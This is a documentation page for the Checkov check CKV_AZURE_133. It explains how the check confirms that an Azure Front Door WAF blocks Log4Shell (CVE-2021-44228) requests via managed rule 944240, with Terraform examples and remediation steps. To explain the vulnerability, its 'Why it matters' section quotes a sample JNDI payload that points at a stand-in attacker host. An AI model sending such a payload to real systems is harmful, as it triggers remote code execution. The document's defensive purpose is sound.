# CKV_AZURE_133: Ensure Front Door WAF prevents message lookup in Log4j2 (CVE-2021-44228, "Log4Shell")
## Severity
**LOW** (score: 2.0/10)

This check ensures the Front Door WAF actually blocks the Log4Shell (CVE-2021-44228) exploit pattern, so failing it leaves internet-facing applications exposed to a well-known, trivially exploitable remote code execution vulnerability.

## Summary
This check ensures an Azure Front Door WAF policy has the Log4j2/Log4Shell-specific managed rule (rule ID `944240` in the Java rule group of the Default/Microsoft Default Rule Set) enabled and set to actively block or redirect matching requests, rather than left disabled or only logging.

## Applicability
**Checkov framework(s):** `arm`, `bicep`, `terraform`

- **ARM**: `Microsoft.Network/frontdoorWebApplicationFirewallPolicies` resources.
- **Terraform**: `azurerm_frontdoor_firewall_policy` resource.
- **Bicep**: compiles to the same ARM resource type.

## Why it matters
CVE-2021-44228 (Log4Shell) is a critical remote-code-execution vulnerability in the widely-used Apache Log4j2 logging library, exploitable by getting the vulnerable application to log an attacker-controlled string containing a JNDI lookup (e.g. `${jndi:ldap://attacker.com/a}`), which causes the application to fetch and execute attacker-supplied Java code. Because Log4j2 is embedded transitively in an enormous number of Java applications and libraries, and because the payload can be smuggled through nearly any user-controllable input that ends up logged (headers, query strings, form fields, User-Agent, etc.), edge/network-layer mitigation via WAF managed rules is a critical defense-in-depth layer even after patching, since patching every downstream dependency is slow and incomplete in practice. If the Front Door WAF's Java rule group rule `944240` (which detects JNDI/Log4Shell-style payloads) is absent, disabled, or set to only log rather than Block/Redirect, malicious requests targeting this vulnerability pass through unimpeded to backend origins.

## How Checkov evaluates this
The check walks `properties.managedRules.managedRuleSets`, looking for a rule set whose `ruleSetType` is `DefaultRuleSet` or `Microsoft_DefaultRuleSet`. Two ways to PASS:
1. If that rule set has an empty `ruleGroupOverrides` list, it means Microsoft's fully-managed defaults apply (rule `944240` enabled/blocking by default), so it PASSES.
2. Otherwise, it inspects overrides for the `JAVA` rule group, then within that group looks for `ruleId == "944240"`. It FAILS if that rule's `enabledState` is falsy (explicitly disabled), and PASSES only if `action` is `Block` or `Redirect`.
If no matching managed rule set / rule found at all, or `managedRules` is missing entirely, the result is FAILED (fail-closed default).

## Non-compliant example
```hcl
resource "azurerm_frontdoor_firewall_policy" "example" {
  name                = "examplefdwafpolicy"
  resource_group_name = azurerm_resource_group.example.name

  managed_rule {
    type    = "DefaultRuleSet"
    version = "1.0"

    override {
      rule_group_name = "JAVA"

      rule {
        rule_id = "944240"
        enabled = true
        action  = "Log"   # only logs -- Log4Shell requests are NOT blocked
      }
    }
  }
}
```

## Remediated example
```hcl
resource "azurerm_frontdoor_firewall_policy" "example" {
  name                = "examplefdwafpolicy"
  resource_group_name = azurerm_resource_group.example.name

  managed_rule {
    type    = "DefaultRuleSet"
    version = "1.0"

    override {
      rule_group_name = "JAVA"

      rule {
        rule_id = "944240"
        enabled = true
        action  = "Block"   # actively blocks Log4Shell JNDI payloads
      }
    }
  }
}
```

## Remediation steps
1. Simplest fix: don't override the Java rule group at all — let the Default Rule Set's managed defaults apply, which enable and block rule `944240` out of the box.
2. If you do need overrides for the `JAVA` rule group, ensure rule `944240` is explicitly `enabled = true` with `action = "Block"` (or `Redirect`), never `Log` or disabled.
3. Also confirm the overall `mode` of the firewall policy is `Prevention` rather than `Detection` — a rule set to Block only takes effect if the policy mode enforces blocking.
4. Continue to patch/upgrade Log4j2 in application code — WAF mitigation reduces exposure but is not a substitute for remediating the underlying vulnerable dependency.

## References
- Checkov check source (ARM): https://github.com/bridgecrewio/checkov/blob/main/checkov/arm/checks/resource/FrontDoorWAFACLCVE202144228.py
- Checkov check source (Terraform): https://github.com/bridgecrewio/checkov/blob/main/checkov/terraform/checks/resource/azure/FrontDoorWAFACLCVE202144228.py
- CVE record: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- Microsoft docs on Front Door WAF managed rules: https://learn.microsoft.com/en-us/azure/web-application-firewall/afds/waf-front-door-drs
